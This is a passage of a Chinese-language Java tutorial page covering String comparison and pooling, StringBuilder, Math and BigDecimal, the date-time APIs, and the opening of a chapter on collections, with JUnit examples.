class="comment">//true</span></span><br></pre></td></tr></table></figure><p>3、equalsIgnoreCase：比较的是对象的内容，不区分大小写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">"HELLO"</span>);</span><br><span class="line">str1.equalsIgnoreCase(strs) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>4、compareTo：String类型重写了Comparable接口的抽象方法，自然排序，按照字符的Unicode编码值进行比较大小的，严格区分大小写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">"hello"</span>;</span><br><span class="line">String str2 = <span class="string">"world"</span>;</span><br><span class="line">str1.compareTo(str2) <span class="comment">//小于0的值</span></span><br></pre></td></tr></table></figure><p>5、compareToIgnoreCase：不区分大小写，其他按照字符的Unicode编码值进行比较大小</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">"HELLO"</span>);</span><br><span class="line">str1.compareToIgnoreCase(str2)  <span class="comment">//等于0</span></span><br></pre></td></tr></table></figure><h3 id="11-2-3-空字符的比较"><a href="#11-2-3-空字符的比较" class="headerlink" title="11.2.3 空字符的比较"></a>11.2.3 空字符的比较</h3><p>1、哪些是空字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">""</span>;</span><br><span class="line">String str2 = <span class="keyword">new</span> String();</span><br><span class="line">String str3 = <span class="keyword">new</span> String(<span class="string">""</span>);</span><br></pre></td></tr></table></figure><p>空字符串：长度为0</p><p>2、如何判断某个字符串是否是空字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">""</span>.equals(str))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(str!=<span class="keyword">null</span>  &amp;&amp; str.isEmpty())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(str!=<span class="keyword">null</span> &amp;&amp; str.equals(<span class="string">""</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(str!=<span class="keyword">null</span> &amp;&amp; str.length()==<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="11-2-4-字符串的对象的个数"><a href="#11-2-4-字符串的对象的个数" class="headerlink" title="11.2.4 字符串的对象的个数"></a>11.2.4 字符串的对象的个数</h3><p>1、字符串常量对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">"hello"</span>;<span class="comment">//1个，在常量池中</span></span><br></pre></td></tr></table></figure><p>2、字符串的普通对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str2 = <span class="keyword">new</span> String();</span><br><span class="line">String str22 = <span class="keyword">new</span> String(<span class="string">""</span>);</span><br><span class="line"><span class="comment">//两个对象，一个是常量池中的空字符串对象，一个是堆中的空字符串对象</span></span><br></pre></td></tr></table></figure><p>3、字符串的普通对象和常量对象一起</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str3 = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line"><span class="comment">//str3首先指向堆中的一个字符串对象，然后堆中字符串的value数组指向常量池中常量对象的value数组</span></span><br></pre></td></tr></table></figure><h3 id="11-2-5-字符串拼接结果"><a href="#11-2-5-字符串拼接结果" class="headerlink" title="11.2.5 字符串拼接结果"></a>11.2.5 字符串拼接结果</h3><p>原则：</p><p>（1）常量+常量：结果是常量池</p><p>（2）常量与变量 或 变量与变量：结果是堆</p><p>（3）拼接后调用intern方法：结果在常量池</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test06</span><span class="params">()</span></span>&#123;</span><br><span class="line">String s1 = <span class="string">"hello"</span>;</span><br><span class="line">String s2 = <span class="string">"world"</span>;</span><br><span class="line">String s3 = <span class="string">"helloworld"</span>;</span><br><span class="line"></span><br><span class="line">String s4 = (s1 + <span class="string">"world"</span>).intern();<span class="comment">//把拼接的结果放到常量池中</span></span><br><span class="line">String s5 = (s1 + s2).intern();</span><br><span class="line"></span><br><span class="line">System.out.println(s3 == s4);<span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s5);<span class="comment">//true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test05</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">final</span> String s1 = <span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">final</span> String s2 = <span class="string">"world"</span>;</span><br><span class="line">String s3 = <span class="string">"helloworld"</span>;</span><br><span class="line"></span><br><span class="line">String s4 = s1 + <span class="string">"world"</span>;<span class="comment">//s4字符串内容也helloworld，s1是常量，"world"常量，常量+ 常量 结果在常量池中</span></span><br><span class="line">String s5 = s1 + s2;<span class="comment">//s5字符串内容也helloworld，s1和s2都是常量，常量+ 常量 结果在常量池中</span></span><br><span class="line">String s6 = <span class="string">"hello"</span> + <span class="string">"world"</span>;<span class="comment">//常量+ 常量 结果在常量池中，因为编译期间就可以确定结果</span></span><br><span class="line"></span><br><span class="line">System.out.println(s3 == s4);<span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s5);<span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s6);<span class="comment">//true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test04</span><span class="params">()</span></span>&#123;</span><br><span class="line">String s1 = <span class="string">"hello"</span>;</span><br><span class="line">String s2 = <span class="string">"world"</span>;</span><br><span class="line">String s3 = <span class="string">"helloworld"</span>;</span><br><span class="line"></span><br><span class="line">String s4 = s1 + <span class="string">"world"</span>;<span class="comment">//s4字符串内容也helloworld，s1是变量，"world"常量，变量 + 常量的结果在堆中</span></span><br><span class="line">String s5 = s1 + s2;<span class="comment">//s5字符串内容也helloworld，s1和s2都是变量，变量 + 变量的结果在堆中</span></span><br><span class="line">String s6 = <span class="string">"hello"</span> + <span class="string">"world"</span>;<span class="comment">//常量+ 常量 结果在常量池中，因为编译期间就可以确定结果</span></span><br><span class="line"></span><br><span class="line">System.out.println(s3 == s4);<span class="comment">//false</span></span><br><span class="line">System.out.println(s3 == s5);<span class="comment">//false</span></span><br><span class="line">System.out.println(s3 == s6);<span class="comment">//true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-2-6-字符串的API"><a href="#11-2-6-字符串的API" class="headerlink" title="11.2.6 字符串的API"></a>11.2.6 字符串的API</h3><p>（1）boolean isEmpty()</p><p>（2）int length()</p><p>（3）String concat(xx)：拼接，等价于+</p><p>（4）boolean contanis(xx)</p><p>（5）int indexOf()：从前往后找，要是没有返回-1</p><p>（6）int lastIndexOf()：从后往前找，要是没有返回-1</p><p>（7）char charAt(index)</p><p>（8）new String(char[] ) 或new String(char[] ,int, int)</p><p>（9）char[] toCharArray()</p><p>（10）byte[] getBytes()：编码，把字符串变为字节数组，按照平台默认的字符编码进行编码</p><p>​    byte[] getBytes(字符编码方式)：按照指定的编码方式进行编码</p><p>（11）new String(byte[] ) 或 new String(byte[], int, int)：解码，按照平台默认的字符编码进行解码</p><p>​           new String(byte[]，字符编码方式 ) 或 new String(byte[], int, int，字符编码方式)：解码，按照指定的编码方式进行解码</p><p>（12）String subString(int begin)：从[begin]开始到最后</p><p>String subString(int begin,int end)：从[begin, end)</p><p>（13）boolean matchs(正则表达式)</p><p>（14）String replace(xx,xx)：不支持正则</p><p>String replaceFirst(正则，value)：替换第一个匹配部分</p><p>String repalceAll(正则， value)：替换所有匹配部分</p><p>（15）String[] split(正则)：按照某种规则进行拆分</p><p>（16）boolean startsWith(xx)：是否以xx开头</p><p>boolean endsWith(xx)：是否以xx结尾</p><p>（17）String trim()：去掉前后空白符，字符串中间的空白符不会去掉</p><p>（18）String toUpperCase()：转大写</p><p>（19）String  toLowerCase()：转小写</p><p>面试题：字符串的length和数组的length有什么不同？</p><p>字符串的length()，数组的length属性</p><h2 id="11-3-可变字符序列"><a href="#11-3-可变字符序列" class="headerlink" title="11.3 可变字符序列"></a>11.3 可变字符序列</h2><p>1、可变字符序列：StringBuilder和StringBuffer</p><p>StringBuffer：老的，线程安全的（因为它的方法有synchronized修饰）</p><p>StringBuilder：线程不安全的</p><p>2、面试题：String和StringBuilder、StringBuffer的区别？</p><p>String：不可变对象，不可变字符序列</p><p>StringBuilder、StringBuffer： 可变字符序列</p><p>3、常用的API，StringBuilder、StringBuffer的API是完全一致的</p><p>（1）append(xx)：拼接，追加</p><p>（2）insert(int index, xx)：插入</p><p>（3）delete(int start, int end)</p><p>deleteCharAt(int index)</p><p>（4）set(int index, xx)</p><p>（5）reverse()：反转</p><p>….  替换、截取、查找…</p><h2 id="11-4-和数学相关的"><a href="#11-4-和数学相关的" class="headerlink" title="11.4 和数学相关的"></a>11.4 和数学相关的</h2><p>1、java.lang.Math类</p><p>（1）sqrt()：求平方根</p><p>（2）pow(x,y)：求x的y次方</p><p>（3）random()：返回[0,1)范围的小数</p><p>（4）max(x,y)：找x,y最大值</p><p>​      min(x,y)：找最小值</p><p>（5）round(x)：四舍五入</p><p>​         ceil(x)：进一</p><p>​         floor(x)：退一</p><p>…..</p><p>2、java.math包</p><p>BigInteger：大整数</p><p>BigDecimal：大小数</p><p>运算通过方法完成：add(),subtract(),multiply(),divide()….</p><h2 id="11-5-日期时间API"><a href="#11-5-日期时间API" class="headerlink" title="11.5 日期时间API"></a>11.5 日期时间API</h2><h3 id="11-5-1-JDK1-8之前"><a href="#11-5-1-JDK1-8之前" class="headerlink" title="11.5.1 JDK1.8之前"></a>11.5.1 JDK1.8之前</h3><p>1、java.util.Date</p><p>new  Date()：当前系统时间</p><p>long  getTime()：返回该日期时间对象距离1970-1-1 0.0.0 0毫秒之间的毫秒值</p><p>new Date(long 毫秒)：把该毫秒值换算成日期时间对象</p><p>2、java.util.Calendar：</p><p>（1）getInstance()：得到Calendar的镀锡</p><p>（2）get(常量)</p><p>3、java.text.SimpleDateFormat：日期时间的格式化</p><p>y：表示年</p><p>M：月</p><p>d：天</p><p>H： 小时，24小时制</p><p>h：小时，12小时制</p><p>m：分</p><p>s：秒</p><p>S：毫秒</p><p>E：星期</p><p>D：年当中的天数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span> <span class="keyword">throws</span> ParseException</span>&#123;</span><br><span class="line">String str = <span class="string">"2019年06月06日 16时03分14秒 545毫秒  星期四 +0800"</span>;</span><br><span class="line">SimpleDateFormat sf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy年MM月dd日 HH时mm分ss秒 SSS毫秒  E Z"</span>);</span><br><span class="line">Date d = sf.parse(str);</span><br><span class="line">System.out.println(d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test9</span><span class="params">()</span></span>&#123;</span><br><span class="line">Date d = <span class="keyword">new</span> Date();</span><br><span class="line"></span><br><span class="line">SimpleDateFormat sf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy年MM月dd日 HH时mm分ss秒 SSS毫秒  E Z"</span>);</span><br><span class="line"><span class="comment">//把Date日期转成字符串，按照指定的格式转</span></span><br><span class="line">String str = sf.format(d);</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span>&#123;</span><br><span class="line">String[] all = TimeZone.getAvailableIDs();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; all.length; i++) &#123;</span><br><span class="line">System.out.println(all[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">TimeZone t = TimeZone.getTimeZone(<span class="string">"America/Los_Angeles"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//getInstance(TimeZone zone)</span></span><br><span class="line">Calendar c = Calendar.getInstance(t);</span><br><span class="line">System.out.println(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span>&#123;</span><br><span class="line">Calendar c = Calendar.getInstance();</span><br><span class="line">System.out.println(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> year = c.get(Calendar.YEAR);</span><br><span class="line">System.out.println(year);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> month = c.get(Calendar.MONTH)+<span class="number">1</span>;</span><br><span class="line">System.out.println(month);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">long</span> time = Long.MAX_VALUE;</span><br><span class="line">Date d = <span class="keyword">new</span> Date(time);</span><br><span class="line">System.out.println(d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">long</span> time = <span class="number">1559807047979L</span>;</span><br><span class="line">Date d = <span class="keyword">new</span> Date(time);</span><br><span class="line">System.out.println(d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">Date d = <span class="keyword">new</span> Date();</span><br><span class="line"><span class="keyword">long</span> time = d.getTime();</span><br><span class="line">System.out.println(time);<span class="comment">//1559807047979</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">long</span> time = System.currentTimeMillis();</span><br><span class="line">System.out.println(time);<span class="comment">//1559806982971</span></span><br><span class="line"><span class="comment">//当前系统时间距离1970-1-1 0:0:0 0毫秒的时间差，毫秒为单位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">Date d = <span class="keyword">new</span> Date();</span><br><span class="line">System.out.println(d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-5-2-JDK1-8之后"><a href="#11-5-2-JDK1-8之后" class="headerlink" title="11.5.2 JDK1.8之后"></a>11.5.2 JDK1.8之后</h3><p>java.time及其子包中。</p><p>1、LocalDate、LocalTime、LocalDateTime</p><p>（1）now()：获取系统日期或时间</p><p>（2）of(xxx)：或者指定的日期或时间</p><p>（3）运算：运算后得到新对象，需要重新接受</p><p>plusXxx()：在当前日期或时间对象上加xx</p><p>minusXxx() ：在当前日期或时间对象上减xx</p><table><thead><tr><th>方法</th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>now() / now(ZoneId zone)</td><td>静态方法，根据当前时间创建对象/指定时区的对象</td></tr><tr><td>of()</td><td>静态方法，根据指定日期/时间创建对象</td></tr><tr><td>getDayOfMonth()/getDayOfYear()</td><td>获得月份天数(1-31) /获得年份天数(1-366)</td></tr><tr><td>getDayOfWeek()</td><td>获得星期几(返回一个 DayOfWeek 枚举值)</td></tr><tr><td>getMonth()</td><td>获得月份, 返回一个 Month 枚举值</td></tr><tr><td>getMonthValue() / getYear()</td><td>获得月份(1-12) /获得年份</td></tr><tr><td>getHours()/getMinute()/getSecond()</td><td>获得当前对象对应的小时、分钟、秒</td></tr><tr><td>withDayOfMonth()/withDayOfYear()/withMonth()/withYear()</td><td>将月份天数、年份天数、月份、年份修改为指定的值并返回新的对象</td></tr><tr><td>with(TemporalAdjuster  t)</td><td>将当前日期时间设置为校对器指定的日期时间</td></tr><tr><td>plusDays(), plusWeeks(), plusMonths(), plusYears(),plusHours()</td><td>向当前对象添加几天、几周、几个月、几年、几小时</td></tr><tr><td>minusMonths() / minusWeeks()/minusDays()/minusYears()/minusHours()</td><td>从当前对象减去几月、几周、几天、几年、几小时</td></tr><tr><td>plus(TemporalAmount t)/minus(TemporalAmount t)</td><td>添加或减少一个 Duration 或 Period</td></tr><tr><td>isBefore()/isAfter()</td><td>比较两个 LocalDate</td></tr><tr><td>isLeapYear()</td><td>判断是否是闰年（在LocalDate类中声明）</td></tr><tr><td>format(DateTimeFormatter  t)</td><td>格式化本地日期、时间，返回一个字符串</td></tr><tr><td>parse(Charsequence text)</td><td>将指定格式的字符串解析为日期、时间</td></tr></tbody></table><p>2、DateTimeFormatter：日期时间格式化</p><p>该类提供了三种格式化方法：</p><p>预定义的标准格式。如：ISO_DATE_TIME;ISO_DATE</p><p>本地化相关的格式。如：ofLocalizedDate(FormatStyle.MEDIUM)</p><p>自定义的格式。如：ofPattern(“yyyy-MM-dd hh:mm:ss”)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDateTime now = LocalDateTime.now();</span><br><span class="line"></span><br><span class="line"><span class="comment">//DateTimeFormatter df = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.LONG);//2019年6月6日 下午04时40分03秒</span></span><br><span class="line">DateTimeFormatter df = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.SHORT);<span class="comment">//19-6-6 下午4:40</span></span><br><span class="line">String str = df.format(now);</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test9</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDateTime now = LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">DateTimeFormatter df = DateTimeFormatter.ISO_DATE_TIME;<span class="comment">//2019-06-06T16:38:23.756</span></span><br><span class="line">String str = df.format(now);</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDateTime now = LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">DateTimeFormatter df = DateTimeFormatter.ofPattern(<span class="string">"yyyy年MM月dd日 HH时mm分ss秒  SSS毫秒  E 是这一年的D天"</span>);</span><br><span class="line">String str = df.format(now);</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDate now = LocalDate.now();</span><br><span class="line">LocalDate before = now.minusDays(<span class="number">100</span>);</span><br><span class="line">System.out.println(before);<span class="comment">//2019-02-26</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test06</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDate lai = LocalDate.of(<span class="number">2019</span>, <span class="number">5</span>, <span class="number">13</span>);</span><br><span class="line">LocalDate go = lai.plusDays(<span class="number">160</span>);</span><br><span class="line">System.out.println(go);<span class="comment">//2019-10-20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test05</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDate lai = LocalDate.of(<span class="number">2019</span>, <span class="number">5</span>, <span class="number">13</span>);</span><br><span class="line">System.out.println(lai.getDayOfYear());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test04</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDate lai = LocalDate.of(<span class="number">2019</span>, <span class="number">5</span>, <span class="number">13</span>);</span><br><span class="line">System.out.println(lai);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test03</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDateTime now = LocalDateTime.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalTime now = LocalTime.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">LocalDate now = LocalDate.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第十二章-集合"><a href="#第十二章-集合" class="headerlink" title="第十二章 集合"></a>第十二章 集合</h1><h2 id="12-1-概念"><a href="#12-1-概念" class="headerlink" title="12.1 概念"></a>12.1 概念</h2><p>数据结构：存储数据的某种结构</p><p>（1）底层的物理结构</p><p>①数组：开辟连续的存储空间，每一个元素使用[下标]进行区别</p><p>②链式：不需要开辟连续的存储空间，但是需要“结点”来包装要存储的数据，结点包含两部分内容：</p><p>​    A、数据</p><p>​    B、记录其他结点的地址，例如：next，pre，left，right，parent等</p><p>（2）表现出来的逻辑结构：动态数组、单向链表、双向链表、队列、栈、二叉树、哈希表、图等</p><h2 id="12-2-手动实现一些逻辑结构"><a href="#12-2-手动实现一些逻辑结构" class="headerlink" title="12.2 手动实现一些逻辑结构"></a>12.2 手动实现一些逻辑结构</h2><p>1、动态数组</p><p>包含：</p><p>（1）内部使用一个数组，用来存储数据</p><p>（2）内部使用一个total，记录实际存储的元素的个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 